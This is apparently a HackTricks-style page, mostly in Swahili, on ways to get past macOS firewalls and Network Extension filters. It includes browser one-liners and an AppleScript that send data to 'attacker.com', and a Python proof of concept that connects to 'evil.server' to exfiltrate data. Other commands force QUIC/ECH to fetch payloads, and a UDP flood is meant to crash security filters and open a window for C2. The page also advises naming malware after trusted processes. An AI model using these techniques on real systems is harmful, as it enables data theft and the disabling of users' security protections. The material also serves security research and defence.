# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Mbinu zilizopatikana

Mbinu zifuatazo zilionekana zikitumika kwenye baadhi ya programu za firewall za macOS.

### Abusing whitelist names

- Kwa mfano, kumuita malware kwa majina ya michakato maarufu ya macOS kama **`launchd`**

### Synthetic Click

- Ikiwa firewall itaomba ruhusa kwa mtumiaji, fanya malware **click on allow**

### **Use Apple signed binaries**

- Kama **`curl`**, lakini pia wengine kama **`whois`**

### Well known apple domains

Firewall inaweza kuruhusu miunganisho kwa domain za apple zinazojulikana kama **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.

### Generic Bypass

Baadhi ya mawazo ya kujaribu kupitisha firewalls

### Check allowed traffic

Kujua trafiki iliyoruhusiwa kutakusaidia kubaini domains ambazo zinaweza kuwa whitelisted au ni programu gani zimepewa ruhusa kuzipata
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia vibaya DNS

Utatuzi wa DNS unafanywa kupitia programu iliyosainiwa **`mdnsreponder`**, ambayo inawezekana itaruhusiwa kuwasiliana na seva za DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Kupitia programu za kivinjari

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia processes injections

Ikiwa unaweza **inject code into a process** ambayo imepewa ruhusa kuungana na server yoyote, unaweza bypass firewall protections:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Hivi karibuni macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Mnamo Julai 2024 Apple ili-patch bug muhimu katika Safari/WebKit ambayo ilivunja system-wide “Web content filter” inayotumika na Screen Time parental controls.
URI maalum iliyotengenezwa (kwa mfano, kwa double URL-encoded “://”) haikubaliwa/haitioneki na Screen Time ACL lakini inakubaliwa na WebKit, hivyo request inatumwa nje bila kuchujwa. Process yoyote inayoweza kufungua URL (ikijumuisha sandboxed au unsigned code) inaweza hivyo kufikia domains ambazo zimezuiwa waziwazi na mtumiaji au MDM profile.

Jaribio la vitendo (sistema isiyopatchiwa):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) hitilafu ya utaratibu wa sheria katika macOS 14 “Sonoma”
Wakati wa mzunguko wa beta wa macOS 14, Apple ilileta regression katika userspace wrapper inayozunguka **`pfctl`**.
Sheria zilizoongezwa kwa nenosiri `quick` (linalotumika na kill-switches nyingi za VPN) zilisahaulika kimya, zikisababisha traffic leaks hata wakati GUI ya VPN/firewall iliripoti *blocked*. Hitilafu ilithibitishwa na wauzaji kadhaa wa VPN na ilirekebishwa katika RC 2 (build 23A344).

Uhakiki wa haraka wa leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Kutumia vibaya huduma za msaidizi zilizosainiwa na Apple (za kale – kabla ya macOS 11.2)
Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu takriban ~50 binaries za Apple kama **`nsurlsessiond`** na App Store kupita kando firewall zote za kuchuja socket zilizotekelezwa kupitia Network Extension framework (LuLu, Little Snitch, n.k.).
Malware ilikuwa inaweza tu kuzindua mchakato uliokataliwa—au kuingiza code ndani yake—na kupeleka trafiki yake kupitia socket iliyoruhusiwa tayari. Apple iliondoa kabisa exclusion list katika macOS 11.2, lakini mbinu hiyo bado ni muhimu kwenye mifumo ambayo haiwezi kusasishwa.

Mfano wa proof-of-concept (kabla ya 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH ili kuepuka Network Extension domain filters (macOS 12+)
NEFilter Packet/Data Providers hutegemea TLS ClientHello SNI/ALPN. Kwa **HTTP/3 over QUIC (UDP/443)** na **Encrypted Client Hello (ECH)** SNI hubaki iliyofichwa, NetExt haiwezi kuchambua mtiririko, na kanuni za hostname mara nyingi huwa fail-open, kuruhusu malware kufikia domains zilizozuiwa bila kugusa DNS.

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ikiwa QUIC/ECH bado imewezeshwa, hii ni njia rahisi ya kuepuka hostname-filter.

### macOS 15 “Sequoia” Network Extension kutokuwa imara (2024–2025)
Majaribio ya awali ya 15.0/15.1 husababisha kuanguka kwa vichujio vya pande za tatu vya **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, n.k.). Wakati vichujio vinaporejeshwa, macOS inafuta flow rules zake na bidhaa nyingi zinafail‑open. Kujaza chujio na maelfu ya flow fupi za UDP (au kulazimisha QUIC/ECH) kunaweza kusababisha crash mara kwa mara na kuacha dirisha kwa ajili ya C2/exfil wakati GUI bado inadai firewall inaendesha.

Uigaji wa haraka (sanduku salama la maabara):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Vidokezo vya zana kwa macOS ya kisasa

1. Kagua sheria za PF za sasa ambazo firewalls za GUI zinatengeneza:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Orodhesha binaries ambazo tayari zina *outgoing-network* entitlement (zinatumika kwa piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Sajili kwa njia ya programu Network Extension content filter yako kwa Objective-C/Swift. PoC ndogo, isiyo na root (rootless), inayotuma packets kwa socket ya ndani inapatikana katika msimbo wa chanzo wa Patrick Wardle’s **LuLu**.

## Marejeleo

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
